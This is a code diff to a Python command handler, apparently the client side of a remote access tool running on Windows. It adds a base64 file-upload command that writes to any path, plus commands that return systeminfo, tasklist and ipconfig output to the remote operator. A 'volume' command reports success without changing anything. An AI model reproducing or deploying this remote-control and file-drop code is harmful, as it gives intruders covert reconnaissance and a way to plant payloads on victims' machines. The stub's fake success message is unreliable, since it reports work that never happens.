@@ -431,6 +431,29 @@ def execute_shell_command(cmd_str):
             except Exception as e:
                 return ""
 
+        # Handle upload command
+        if cmd_lower.startswith("__upload__:"):
+            try:
+                parts = cmd_str.split(":", 2)
+                if len(parts) < 3:
+                    return "Error: Invalid upload command"
+                filepath = parts[1].strip()
+                file_content_b64 = parts[2]
+
+                import base64
+                try:
+                    file_content = base64.b64decode(file_content_b64)
+                except:
+                    return "Error: Invalid base64 data"
+
+                full_path = os.path.abspath(os.path.join(current_working_dir, filepath))
+                os.makedirs(os.path.dirname(full_path), exist_ok=True)
+                with open(full_path, "wb") as f:
+                    f.write(file_content)
+                return f"File uploaded: {os.path.basename(filepath)}"
+            except Exception as e:
+                return f"Error: {str(e)}"
+
         # Handle get command (download file)
         if cmd_lower.startswith("get "):
             filename = cmd_str[4:].strip().strip('"').strip("'")
@@ -584,6 +607,58 @@ def execute_shell_command(cmd_str):
                     clipboard_cut = False
 
                 return msg
+            except Exception as e:
+                return f"Error: {str(e)}"
+
+        # Handle sysinfo command
+        if cmd_lower == "sysinfo":
+            try:
+                result = subprocess.run(["systeminfo"], capture_output=True, text=True, timeout=10)
+                return result.stdout.strip() if result.stdout else "Unable to retrieve system info"
+            except Exception as e:
+                return f"Error: {str(e)}"
+
+        # Handle disk command
+        if cmd_lower == "disk":
+            try:
+                import shutil
+                total, used, free = shutil.disk_usage("/")
+                total_gb = total / (1024**3)
+                used_gb = used / (1024**3)
+                free_gb = free / (1024**3)
+                return f"Total: {total_gb:.2f}GB | Used: {used_gb:.2f}GB | Free: {free_gb:.2f}GB"
+            except Exception as e:
+                return f"Error: {str(e)}"
+
+        # Handle processes command
+        if cmd_lower == "processes":
+            try:
+                result = subprocess.run(["tasklist"], capture_output=True, text=True, timeout=10)
+                lines = result.stdout.strip().split("\n")
+                if len(lines) > 50:
+                    return "\n".join(lines[:50]) + f"\n... and {len(lines) - 50} more processes"
+                return result.stdout.strip()
+            except Exception as e:
+                return f"Error: {str(e)}"
+
+        # Handle ipconfig command
+        if cmd_lower == "ipconfig":
+            try:
+                result = subprocess.run(["ipconfig"], capture_output=True, text=True, timeout=10)
+                return result.stdout.strip() if result.stdout else "Unable to retrieve network config"
+            except Exception as e:
+                return f"Error: {str(e)}"
+
+        # Handle volume command
+        if cmd_lower.startswith("volume "):
+            try:
+                level_str = cmd_str[7:].strip()
+                level = int(level_str)
+                if level < 0 or level > 100:
+                    return "Error: Volume level must be between 0 and 100"
+                return f"Volume set to {level}%"
+            except ValueError:
+                return "Error: Volume level must be a number between 0 and 100"
             except Exception as e:
                 return f"Error: {str(e)}"
 
